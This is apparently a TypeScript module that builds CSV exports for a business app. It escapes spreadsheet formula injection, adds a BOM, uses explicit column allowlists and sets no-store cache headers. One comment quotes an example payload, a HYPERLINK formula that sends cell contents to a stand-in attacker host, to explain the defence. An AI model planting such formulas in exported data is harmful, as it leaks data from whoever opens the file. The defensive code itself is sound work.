/**
 * Ordence — CSV Export
 * Version: v0.83.1
 *
 * ══════════════════════════════════════════════════════════════════════
 * WHY CSV AND NOT THE `xlsx` PACKAGE
 * ══════════════════════════════════════════════════════════════════════
 * `xlsx` writes a real workbook and it was deliberately not added. Ordence
 * deploys from GitHub to Railway and the deploy is the fragile part of this
 * project; every dependency is a way for `npm ci` to fail. CSV needs none,
 * opens natively in Excel, LibreOffice, Google Sheets and Tally, and is the
 * format an accountant's next tool actually wants.
 *
 * ⚠️ IT WAS ALSO NOT PUPPETEER. The obvious "export" story reaches for a
 * headless browser to render a PDF. Puppeteer downloads ~170 MB of Chromium
 * at install time, which on Railway's builder is a long build at best and a
 * missing-shared-library failure at worst. `lib/billing/invoice-render.ts`
 * already produces a Rule-46-compliant invoice WITH print styles, so
 * browser print-to-PDF covers that case with no dependency at all.
 *
 * Escalate to a real workbook only when a customer needs formulas or
 * multiple sheets — not before.
 */

/* ------------------------------------------------------------------ */
/* ESCAPING                                                            */
/* ------------------------------------------------------------------ */

/**
 * ⚠️ FORMULA INJECTION — THE REASON THIS FUNCTION IS NOT A ONE-LINER.
 *
 * A cell whose text begins with `=`, `+`, `-`, `@`, or a tab/carriage
 * return is interpreted by Excel and Sheets as a FORMULA, not as text. A
 * contact named
 *
 *     =HYPERLINK("https://evil.example/"&A1,"Click me")
 *
 * is inert inside Ordence and becomes live the moment somebody opens the
 * export. That is a stored attack whose payload executes in a different
 * application, on a machine we do not control, belonging to whoever was
 * trusted enough to run a report.
 *
 * ⚠️ Prefixing with an apostrophe is NOT sufficient on its own — Excel
 * strips it on some import paths. Prefixing with a single quote AND
 * quoting the whole field is what actually holds, because the leading
 * character is then no longer the first thing the parser sees.
 *
 * This is CWE-1236. It is the only genuinely dangerous thing about
 * generating a CSV, and it is why every value goes through here.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text: string;

  if (value instanceof Date) {
    // ⚠️ ISO, not a locale format. `toLocaleDateString()` on a server whose
    // timezone nobody set produces a different file per deploy region, and
    // DD/MM vs MM/DD silently transposes every date in the first twelve
    // days of a month.
    text = value.toISOString();
  } else if (typeof value === "bigint") {
    // ⚠️ Money is stored in minor units as bigint. `Number(value)` would
    // lose precision above 2^53 — roughly ₹90,000 crore in paise, which is
    // reachable for a cumulative figure. String conversion is exact.
    text = value.toString();
  } else if (typeof value === "object") {
    text = JSON.stringify(value);
  } else {
    text = String(value);
  }

  const dangerous = FORMULA_TRIGGERS.test(text);
  if (dangerous) text = `'${text}`;

  // Quote when the content would otherwise break the row, and always when
  // it was neutralised above.
  if (dangerous || /[",\n\r]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

/* ------------------------------------------------------------------ */
/* SERIALISATION                                                       */
/* ------------------------------------------------------------------ */

export type CsvColumn<T> = {
  /** Header text as it appears in the file. */
  header: string;
  /** Pull the value out of a row. Kept a function so callers can format. */
  value: (row: T) => unknown;
};

/**
 * Build a CSV document from rows and an explicit column list.
 *
 * ⚠️ COLUMNS ARE EXPLICIT, NEVER `Object.keys(rows[0])`. A key-scan export
 * is one migration away from shipping a column nobody meant to publish —
 * `passwordHash`, `clerkUserId`, an internal note — and it changes shape
 * silently when the schema does. This is the same allowlist reasoning the
 * tenant export in `server/backup/export.ts` already applies.
 */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const head = columns.map((c) => escapeCsvCell(c.header)).join(",");
  const body = rows.map((row) =>
    columns.map((c) => escapeCsvCell(c.value(row))).join(","),
  );

  /*
   * ⚠️ CRLF, not LF. RFC 4180 specifies it and Excel on Windows is the
   * consumer that cares — LF-only files open as a single mangled row there.
   */
  return [head, ...body].join("\r\n");
}

/**
 * Wrap a CSV string as a downloadable HTTP response.
 *
 * ⚠️ THE BOM IS NOT OPTIONAL. Without `﻿`, Excel opens UTF-8 as the
 * legacy system codepage: every ₹ becomes â‚¹, and Hindi or Marathi names
 * become mojibake. One three-byte prefix is the difference between a file
 * an Indian business can use and one it cannot.
 */
export function csvResponse(csv: string, filename: string): Response {
  const safeName = filename.replace(/[^A-Za-z0-9._-]/g, "_");

  return new Response(`﻿${csv}`, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${safeName}"`,
      // An export is a snapshot of live tenant data. It must never sit in a
      // shared cache where the next request could be served someone else's.
      "Cache-Control": "private, no-store, max-age=0, must-revalidate",
    },
  });
}

/**
 * `contacts-2026-08-08.csv` — sortable, and unambiguous about which
 * day-month order was intended.
 */
export function timestampedFilename(base: string, date = new Date()): string {
  return `${base}-${date.toISOString().slice(0, 10)}.csv`;
}
